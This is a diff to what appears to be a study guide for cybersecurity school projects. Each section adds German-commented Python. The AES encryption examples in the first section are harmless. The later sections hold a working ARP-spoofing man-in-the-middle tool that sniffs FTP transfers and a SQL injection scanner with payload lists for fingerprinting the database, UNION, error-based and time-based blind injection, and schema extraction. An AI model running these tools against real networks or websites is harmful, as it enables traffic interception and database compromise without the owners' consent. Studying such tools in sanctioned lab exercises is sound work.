@@ -400,16 +400,481 @@ if __name__ == "__main__":
 
 ## Cybersecurity - Stockholm - Malware
 
-You must validate each project in that
+```
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+class AESExample:
+    def __init__(self):
+        # AES-128 verwendet einen 16-Byte Schlüssel
+        self.key = get_random_bytes(16)
+
+    def encrypt_data(self, data):
+        """Demonstriert AES Verschlüsselung im EAX-Modus"""
+        # Erstelle neuen Cipher im EAX-Modus
+        cipher = AES.new(self.key, AES.MODE_EAX)
+
+        # Speichere nonce (number used once) für Entschlüsselung
+        nonce = cipher.nonce
+
+        # Verschlüssele Daten und erstelle MAC (Message Authentication Code)
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+
+        return {
+            'nonce': nonce,      # Wird für Entschlüsselung benötigt
+            'ciphertext': ciphertext,  # Verschlüsselte Daten
+            'tag': tag          # Für Integritätsprüfung
+        }
+
+    def decrypt_data(self, encrypted_data):
+        """Demonstriert AES Entschlüsselung"""
+        # Rekonstruiere Cipher mit original nonce
+        cipher = AES.new(self.key, AES.MODE_EAX, nonce=encrypted_data['nonce'])
+
+        # Entschlüssele und verifiziere Integrität
+        try:
+            plaintext = cipher.decrypt_and_verify(
+                encrypted_data['ciphertext'],
+                encrypted_data['tag']
+            )
+            return plaintext
+        except ValueError:
+            # Wird ausgelöst wenn Daten manipuliert wurden
+            return None
+
+# Beispiel für sicheres Datei-Handling
+def secure_file_encryption(input_file, output_file, key):
+    """Sicheres Verschlüsseln einer Datei"""
+    # Lese Datei in Chunks für große Dateien
+    CHUNK_SIZE = 64 * 1024  # 64KB chunks
+
+    cipher = AES.new(key, AES.MODE_EAX)
+
+    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
+        # Schreibe nonce
+        f_out.write(cipher.nonce)
+
+        # Verarbeite Datei in Chunks
+        while True:
+            chunk = f_in.read(CHUNK_SIZE)
+            if len(chunk) == 0:
+                break
+            # Verschlüssele chunk
+            encrypted_chunk = cipher.encrypt(chunk)
+            f_out.write(encrypted_chunk)
+
+        # Schreibe MAC am Ende
+        f_out.write(cipher.digest())
+```
 
 ## (Optional) Cybersecurity - Iron Dome - Malware
 
-You must validate each project in that
+...
 
 ## Cybersecurity - Inquisitor - Network
 
-You must validate each project in that
+```
+#!/usr/bin/env python3
+import sys
+import time
+import argparse
+from scapy.all import *
+from scapy.layers.l2 import ARP, Ether
+from scapy.layers.inet import IP, TCP
+import threading
+
+class ARPSpoofer:
+    def __init__(self, ip_src, mac_src, ip_target, mac_target):
+        self.ip_src = ip_src
+        self.mac_src = mac_src
+        self.ip_target = ip_target
+        self.mac_target = mac_target
+        self.stop_threads = False
+
+    def restore_arp_tables(self):
+        """Stellt die originalen ARP-Tabellen wieder her"""
+        print("\nWiederherstellung der ARP-Tabellen...")
+
+        # Sende korrekte ARP-Einträge
+        restore_src = ARP(
+            op=2,
+            psrc=self.ip_target,
+            hwsrc=self.mac_target,
+            pdst=self.ip_src,
+            hwdst=self.mac_src
+        )
+
+        restore_target = ARP(
+            op=2,
+            psrc=self.ip_src,
+            hwsrc=self.mac_src,
+            pdst=self.ip_target,
+            hwdst=self.mac_target
+        )
+
+        # Sende mehrmals zur Sicherstellung
+        send(restore_src, count=3, verbose=False)
+        send(restore_target, count=3, verbose=False)
+
+    def arp_spoof(self):
+        """Führt ARP-Spoofing durch"""
+        # Erstelle gefälschte ARP-Pakete
+        arp_src = ARP(
+            op=2,
+            psrc=self.ip_target,
+            hwdst=self.mac_src,
+            pdst=self.ip_src
+        )
+
+        arp_target = ARP(
+            op=2,
+            psrc=self.ip_src,
+            hwdst=self.mac_target,
+            pdst=self.ip_target
+        )
+
+        print("Starting ARP spoofing...")
+
+        while not self.stop_threads:
+            try:
+                # Sende gefälschte ARP-Pakete
+                send(arp_src, verbose=False)
+                send(arp_target, verbose=False)
+                time.sleep(1)
+            except Exception as e:
+                print(f"Error during ARP spoofing: {e}")
+                break
+
+    def packet_sniffer(self):
+        """Überwacht FTP-Datenverkehr"""
+        def process_packet(packet):
+            if packet.haslayer(TCP) and packet.haslayer(Raw):
+                # Filtere FTP-Befehle
+                payload = packet[Raw].load.decode('utf-8', errors='ignore')
+                if any(cmd in payload for cmd in ['STOR ', 'RETR ']):
+                    filename = payload.split(' ')[1].strip()
+                    print(f"FTP File Transfer: {filename}")
+
+        try:
+            # Sniffe Pakete zwischen Source und Target
+            sniff(
+                filter=f"host {self.ip_src} and host {self.ip_target}",
+                prn=process_packet,
+                stop_filter=lambda _: self.stop_threads
+            )
+        except Exception as e:
+            print(f"Error during packet sniffing: {e}")
+
+    def start_attack(self):
+        """Startet den Angriff"""
+        # Starte ARP-Spoofing Thread
+        spoof_thread = threading.Thread(target=self.arp_spoof)
+        spoof_thread.start()
+
+        # Starte Packet-Sniffer Thread
+        sniffer_thread = threading.Thread(target=self.packet_sniffer)
+        sniffer_thread.start()
+
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\nStopping attack...")
+            self.stop_threads = True
+            spoof_thread.join()
+            sniffer_thread.join()
+            self.restore_arp_tables()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("ip_src", help="IP-src")
+    parser.add_argument("mac_src", help="MAC-src")
+    parser.add_argument("ip_target", help="IP-target")
+    parser.add_argument("mac_target", help="MAC-target")
+
+    args = parser.parse_args()
+
+    spoofer = ARPSpoofer(
+        args.ip_src,
+        args.mac_src,
+        args.ip_target,
+        args.mac_target
+    )
+    spoofer.start_attack()
+
+if __name__ == "__main__":
+    main()
+```
 
 ## Cybersecurity - Vaccine - Web
 
-You must validate each project in that
+```
+#!/usr/bin/env python3
+import requests
+import argparse
+import re
+import time
+import urllib.parse
+from typing import List, Dict, Optional
+import json
+import logging
+
+class SQLInjectionTester:
+    def __init__(self, url: str, output_file: str = "results.txt",
+                 request_type: str = "GET", cookie: str = None,
+                 user_agent: str = None):
+        self.url = url
+        self.output_file = output_file
+        self.request_type = request_type
+        self.cookie = cookie
+        self.user_agent = user_agent or "Mozilla/5.0"
+        self.session = requests.Session()
+        self.logger = self._setup_logger()
+
+    def _setup_logger(self):
+        """Konfiguriert Logging"""
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s'
+        )
+        return logging.getLogger('SQLInjectionTester')
+
+    def _make_request(self, payload: str) -> requests.Response:
+        """Sendet HTTP Request mit SQL Injection Payload"""
+        headers = {
+            'User-Agent': self.user_agent
+        }
+        if self.cookie:
+            headers['Cookie'] = self.cookie
+
+        try:
+            if self.request_type == "GET":
+                # Füge Payload zu URL-Parametern hinzu
+                parsed_url = urllib.parse.urlparse(self.url)
+                params = urllib.parse.parse_qs(parsed_url.query)
+
+                # Füge Payload zu jedem Parameter hinzu
+                for param in params:
+                    params[param] = [payload]
+
+                new_query = urllib.parse.urlencode(params, doseq=True)
+                new_url = urllib.parse.urlunparse((
+                    parsed_url.scheme,
+                    parsed_url.netloc,
+                    parsed_url.path,
+                    parsed_url.params,
+                    new_query,
+                    parsed_url.fragment
+                ))
+
+                return self.session.get(new_url, headers=headers)
+            else:
+                # POST Request mit Payload in Body
+                return self.session.post(self.url, data={'input': payload}, headers=headers)
+
+        except requests.RequestException as e:
+            self.logger.error(f"Request failed: {e}")
+            return None
+
+    def detect_dbms(self) -> str:
+        """Erkennt verwendetes Datenbanksystem"""
+        tests = {
+            'MySQL': [
+                "AND extractvalue(rand(),concat(0x3a,version()))",
+                "AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))",
+            ],
+            'PostgreSQL': [
+                "AND (SELECT current_database())",
+                "AND (SELECT version())",
+            ],
+            'MSSQL': [
+                ";SELECT @@version",
+                ";SELECT DB_NAME()",
+            ],
+            'Oracle': [
+                "AND ROWNUM=1",
+                "AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))",
+            ],
+            'SQLite': [
+                "AND sqlite_version()",
+                "AND typeof('x')",
+            ]
+        }
+
+        for dbms, payloads in tests.items():
+            for payload in payloads:
+                response = self._make_request(payload)
+                if response and self._check_dbms_response(response.text, dbms):
+                    return dbms
+        return "Unknown"
+
+    def _check_dbms_response(self, response: str, dbms: str) -> bool:
+        """Überprüft Response auf DBMS-spezifische Merkmale"""
+        indicators = {
+            'MySQL': ['mysql', 'MariaDB'],
+            'PostgreSQL': ['postgresql', 'pgsql'],
+            'MSSQL': ['microsoft', 'sqlserver'],
+            'Oracle': ['oracle', 'ORA-'],
+            'SQLite': ['sqlite']
+        }
+
+        return any(ind.lower() in response.lower() for ind in indicators[dbms])
+
+    def test_union_injection(self) -> List[str]:
+        """Testet UNION-basierte SQL Injection"""
+        union_payloads = [
+            " UNION SELECT NULL--",
+            " UNION SELECT NULL,NULL--",
+            " UNION SELECT NULL,NULL,NULL--",
+            " UNION ALL SELECT NULL--",
+            " UNION ALL SELECT NULL,NULL--",
+            " UNION ALL SELECT NULL,NULL,NULL--"
+        ]
+
+        vulnerable_params = []
+        for payload in union_payloads:
+            response = self._make_request(payload)
+            if response and self._check_union_success(response.text):
+                vulnerable_params.append(payload)
+        return vulnerable_params
+
+    def test_error_injection(self) -> List[str]:
+        """Testet Error-basierte SQL Injection"""
+        error_payloads = [
+            "'",
+            "\"",
+            "\\",
+            "1'",
+            "1\"",
+            "1\\",
+            "1 OR '1'='1",
+            "1' OR '1'='1",
+            "1\" OR \"1\"=\"1",
+            "1')) OR (('x'='x"
+        ]
+
+        vulnerable_params = []
+        for payload in error_payloads:
+            response = self._make_request(payload)
+            if response and self._check_error_success(response.text):
+                vulnerable_params.append(payload)
+        return vulnerable_params
+
+    def test_blind_injection(self) -> List[str]:
+        """Testet Blind SQL Injection"""
+        blind_payloads = [
+            "1' AND SLEEP(5)--",
+            "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "1' AND (SELECT COUNT(*) FROM generated_table)>0--",
+        ]
+
+        vulnerable_params = []
+        for payload in blind_payloads:
+            start_time = time.time()
+            response = self._make_request(payload)
+            duration = time.time() - start_time
+
+            if duration > 5:  # Time-based detection
+                vulnerable_params.append(payload)
+        return vulnerable_params
+
+    def extract_data(self, dbms: str) -> Dict:
+        """Extrahiert Datenbankinformationen"""
+        data = {
+            'databases': [],
+            'tables': [],
+            'columns': [],
+        }
+
+        # DBMS-spezifische Extraktions-Payloads
+        extraction_queries = {
+            'MySQL': {
+                'databases': "UNION SELECT schema_name FROM information_schema.schemata--",
+                'tables': "UNION SELECT table_name FROM information_schema.tables--",
+                'columns': "UNION SELECT column_name FROM information_schema.columns--"
+            },
+            'PostgreSQL': {
+                'databases': "UNION SELECT datname FROM pg_database--",
+                'tables': "UNION SELECT tablename FROM pg_tables--",
+                'columns': "UNION SELECT column_name FROM information_schema.columns--"
+            }
+            # Weitere DBMS können hier hinzugefügt werden
+        }
+
+        if dbms in extraction_queries:
+            for data_type, query in extraction_queries[dbms].items():
+                response = self._make_request(query)
+                if response:
+                    data[data_type] = self._parse_extraction_response(response.text)
+
+        return data
+
+    def _parse_extraction_response(self, response: str) -> List[str]:
+        """Parst extrahierte Daten aus der Response"""
+        # Implementiere Response-Parsing basierend auf der Struktur
+        # Dies ist stark von der Anwendung abhängig
+        return []
+
+    def save_results(self, results: Dict):
+        """Speichert Testergebnisse"""
+        try:
+            with open(self.output_file, 'w') as f:
+                json.dump(results, f, indent=4)
+            self.logger.info(f"Results saved to {self.output_file}")
+        except IOError as e:
+            self.logger.error(f"Error saving results: {e}")
+
+    def run_tests(self):
+        """Führt alle Tests aus"""
+        results = {
+            'url': self.url,
+            'dbms': None,
+            'vulnerabilities': {
+                'union': [],
+                'error': [],
+                'blind': []
+            },
+            'extracted_data': {}
+        }
+
+        # Erkenne DBMS
+        results['dbms'] = self.detect_dbms()
+        self.logger.info(f"Detected DBMS: {results['dbms']}")
+
+        # Führe Tests aus
+        results['vulnerabilities']['union'] = self.test_union_injection()
+        results['vulnerabilities']['error'] = self.test_error_injection()
+        results['vulnerabilities']['blind'] = self.test_blind_injection()
+
+        # Extrahiere Daten wenn verwundbar
+        if any(results['vulnerabilities'].values()):
+            results['extracted_data'] = self.extract_data(results['dbms'])
+
+        # Speichere Ergebnisse
+        self.save_results(results)
+        return results
+
+def main():
+    parser = argparse.ArgumentParser(description='SQL Injection Testing Tool')
+    parser.add_argument('url', help='Target URL')
+    parser.add_argument('-o', '--output', help='Output file', default='results.txt')
+    parser.add_argument('-X', '--request-type', help='Request type', default='GET')
+    parser.add_argument('-c', '--cookie', help='Login cookie')
+    parser.add_argument('-u', '--user-agent', help='User-Agent string')
+
+    args = parser.parse_args()
+
+    tester = SQLInjectionTester(
+        url=args.url,
+        output_file=args.output,
+        request_type=args.request_type,
+        cookie=args.cookie,
+        user_agent=args.user_agent
+    )
+
+    results = tester.run_tests()
+
+if __name__ == "__main__":
+    main()
+```
